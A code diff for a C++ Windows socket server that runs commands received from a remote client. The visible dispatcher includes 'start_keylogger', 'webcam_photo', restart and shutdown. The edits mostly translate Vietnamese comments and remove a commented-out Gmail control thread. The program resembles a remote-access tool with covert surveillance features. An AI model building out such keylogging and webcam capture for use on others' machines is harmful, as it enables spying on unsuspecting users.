@@ -110,7 +110,7 @@ void startSocketServer()
     }
     std::cout << "Client connected." << std::endl;
 
-    // Nhận lệnh từ client
+    // receive initial response from client
     char buffer[1024];
     while (true)
     {
@@ -125,7 +125,7 @@ void startSocketServer()
         std::string cmd(buffer);
         std::cout << "Received command from client: " << cmd << std::endl;
 
-        // Xử lý lệnh trên server
+        // Handle the command
         handleCommand(clientSock, cmd);
     }
 
@@ -209,7 +209,7 @@ void handleCommand(SOCKET sock, const std::string& cmd)
         std::string msg = "Disconnecting from server...";
         sendResponse(sock, msg);
         closesocket(sock);
-        return; // Kết thúc hàm để không xử lý thêm lệnh nào nữa
+        return;
     }
     else if (cmd == "start_keylogger")
     {
@@ -238,7 +238,6 @@ void handleCommand(SOCKET sock, const std::string& cmd)
         std::string msg = "Initiating system restart...";
         sendResponse(sock, msg);
         
-        // Delay một chút để gửi response trước khi restart
         Sleep(1000);
         
         bool success = restartSystem();
@@ -247,14 +246,12 @@ void handleCommand(SOCKET sock, const std::string& cmd)
             std::string errorMsg = "Failed to restart system.";
             sendResponse(sock, errorMsg);
         }
-        // Nếu restart thành công, connection sẽ bị đóng do máy restart
     }
     else if (cmd == "shutdown")
     {
         std::string msg = "Initiating system shutdown...";
         sendResponse(sock, msg);
         
-        // Delay một chút để gửi response trước khi shutdown
         Sleep(1000);
         
         bool success = shutdownSystem();
@@ -263,7 +260,6 @@ void handleCommand(SOCKET sock, const std::string& cmd)
             std::string errorMsg = "Failed to shutdown system.";
             sendResponse(sock, errorMsg);
         }
-        // Nếu shutdown thành công, connection sẽ bị đóng do máy tắt
     }
     else if (cmd == "webcam_photo")
     {
@@ -354,21 +350,10 @@ int main()
     }
     std::cout << "Client connected." << std::endl;
 
-    // // run local Gmail server in a separate thread
-    // std::thread gmailThread([&clientSock]() {
-    //     startGmailControlLoop();
-    //     // Sau khi vòng lặp kết thúc, gửi thông báo đến client
-    //     std::string msg = "Gmail control loop stopped.";
-    //     sendResponse(clientSock, msg);
-    //     closesocket(clientSock); // Đóng socket client khi kết thúc
-    // });
-
-    // gmailThread.detach(); // Detach the thread to run independently
-
     char buffer[1024];
     while (true)
     {
-        // Nhận lệnh từ client
+        // receive initial response from client
         int len = recv(clientSock, buffer, sizeof(buffer) - 1, 0);
         if (len <= 0) 
         {
@@ -380,7 +365,7 @@ int main()
         std::string cmd(buffer);
         std::cout << "Received command from client: " << cmd << std::endl;
         
-        // Xử lý lệnh trên server
+        // Handle the command
         handleCommand(clientSock, cmd);
     }
 
